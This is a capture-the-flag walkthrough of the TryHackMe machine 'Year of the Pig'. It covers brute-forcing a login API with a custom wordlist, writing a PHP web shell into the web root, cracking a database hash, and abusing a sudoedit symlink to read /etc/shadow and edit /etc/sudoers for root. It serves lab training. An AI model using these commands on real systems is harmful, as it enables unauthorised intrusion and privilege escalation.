# Year of the Pig Writeup | TryHackMe



<pre>
</pre>



- OS: _Linux_
- Difficulty: _Hard_
- Creator: [_MuirlandOracle_](https://tryhackme.com/p/MuirlandOracle)
- TryHackMe: [https://tryhackme.com](https://tryhackme.com/)

<pre>
</pre>

Year of the Pig is rated as a hard linux machine. First step needed some custom wordlist generation and a custom script to brute force the password of the user then some basic linux privilege escalation that we are gonna get into.



## Nmap



![Image](https://i.imgur.com/KZNXFNL.png)



We can see that there are just 2 port open, those are 22 for SSH and 80 for http. And right from that nmap scan we can already see we have a possible username which is Marco. But anyways we go on to enumerate port 80 more.

## Web

On the front page we can see that Marco talks about planes a lot so we can surely say he loves them.

![Image](https://i.imgur.com/EjEg6iB.png)

Running gobuster we just get `/login.php` and `/api` that are interesting. Going to `/login.php` and trying some default credentials we get something interesting in the response.

![Image](https://i.imgur.com/psMLDc6.png)

It says `Remember that passwords should be a memorable word, followed by two numbers and a special character` , so that is hinting towards brute force of the login page, and also we need a custom wordlist. So to generate the wordlist as the login page says we need the following format:

```
{Memorable Word}{2 Numbers}{A special character} # For an example Marco99!
```

We can easily just guess the special character and the 2 numbers as the numbers go from 00 to 100, but we need a memorable word, and if we remember from earlier, Marco loves planes and talks about them a lot on the main page, so lets get some words from the page.

![Image](https://i.imgur.com/DpFS0QH.png)

Some words stand out, like the ones `Savoia`, `Macchi` and `Curtiss` so we should remember these three. Then I go on to create a python script to help me generate my custom wordlist:

![Image](https://i.imgur.com/j7ukYP8.png)

So for the input to the script we need to give it a wordlist containing just some basic words and then we give it the name to output the wordlist to.  The input wordlist I will use would look something like this:

![Image](https://i.imgur.com/iaBwpq9.png)

I named the file `input.wordlist`. Then we can run the python script with the syntax:

```
python3 generate-wordlist.py input.wordlist custom_wordlist.out
```

After running that command we get a file `custom_wordlist.out` that we can use as the wordlist to brute force the login password. But now we need to find a way to brute force the login page. We can use `BurpSuite` to see how does the web login page make a request towards the back-end. When intercepting the login request we can see the following:

![Image](https://i.imgur.com/oEdsI7o.png)

We see that it makes a POST request to /api/login with json in the data, that json contains username and the password, but that password is not a clear-text password, it is actually a md5 hash of the password we entered. So now I wrote yet another python script but this time to brute force the credentials. My script looks like this:

![Image](https://i.imgur.com/OYRfC5g.png)

The script takes 3 arguments, the first one is the IP of the machine, then it takes the wordlist to use and then it takes the username to brute force. The script is just going through each password in the wordlist and md5 hashing it then sending a POST request to /api/login with the json data. So when we run this script with the wordlist we generated earlier we get a hit:

![Image](https://i.imgur.com/l5wAYn6.png)

After we login we see that we can run system commands, but commands seem very limited, so there is no way I could get a reverse shell from there, and later when we look at the files we see that actually there are just 5/6 certain commands we can run and that's it, so we can try SSH with the credentials we right now have.

![Image](https://i.imgur.com/bimDPAD.png)

And we successfully get into the box as user  `marco`.

## Privilege escalation

After some basic privilege escalation attempts, like `sudo -l`, finding SUID binaries with the command:

```
find / -perm -4200 -type f 2>/dev/null
```

we don't seem to find anything, but then enumerating the filesystem we find an interesting file inside /var/www which is named `admin.db` but only user `www-data` can read it, so we need to get www-data somehow. And if we remember from earlier when running the command `id` we can see that we are in the `web-developers` group, so that hints that we can probably write files inside /var/www/html, so I try just that:

```
echo '<?php system($_GET['c']); ?>' > /var/www/html/ryaagard.php && chmod 777 /var/www/html/ryaagard.php
```

After running that command we wrote a file called `ryaagard.php` inside the /var/www/html and then also ran `chmod 777` on it so any user can read the file and write to it. Then going over to `http://<MACHINE-IP>/ryaagard.php?c=id` we get code execution!

![Image](https://i.imgur.com/e6tW8dv.png)

So now we can read the `admin.db` file we found, I transfer it to my machine in the following screenshot and then open it in sqlite3:

![Image](https://i.imgur.com/YXisVTD.png)

We can see there is a hash for curtis user, or there is 2 for some reason, anyways we take both to crackstation and 1 of those hashes gives us a clear-text password.

![Image](https://i.imgur.com/sORPMx8.png)

And the new credentials we found are `curtis:[REDACTED]`, with those we can run `su - curtis` on `marco` SSH session to get to `curtis` user.

As user `curtis` we run `sudo -l` and we get the following output:

![Image](https://i.imgur.com/8nnPaFG.png)

We can run `sudoedit /var/www/html/*/*/config.php` as any user on the box. But as `curtis` we can't write to /var/www/html, but `marco` can. So we run the next command as `marco`:

```
cd /var/www/html/ && mkdir -p temp/temp
```

to create the 2 directories. After that we think of what can we actually do with this sudoedit as root, and I remembered symbolic links. Basically we create a symbolic link called `config.php` inside /var/www/html/temp/temp/ and link it to /etc/shadow, and we can do that by running the following command as `marco` user:

```
ln -s /etc/shadow /var/www/html/temp/temp/config.php
```

After we ran that command we go over to user `curtis` and run:

```
sudoedit /var/www/html/temp/temp/config.php
```

And we see the contents of /etc/shadow!

![Image](https://i.imgur.com/safRG77.png)

To get root user I run to following commands:

(user `marco`)

```
ln -s /etc/sudoers /var/www/html/temp/temp/config.php
```

(user `curtis`)

```
sudoedit /var/www/html/temp/temp/config.php
```

And then we add this line anywhere in the file:

```
curtis ALL=(ALL) NOPASSWD:ALL
```

and save that file.

Then we can just run `sudo bash` as user `curtis`.

![Image](https://i.imgur.com/VnMHOaw.png)

And we successfully root the machine!

<pre>
</pre>

## Contact

- Twitter: [_ryaagard_](https://twitter.com/ryaagard)
- Discord: *ryaagard#5027*

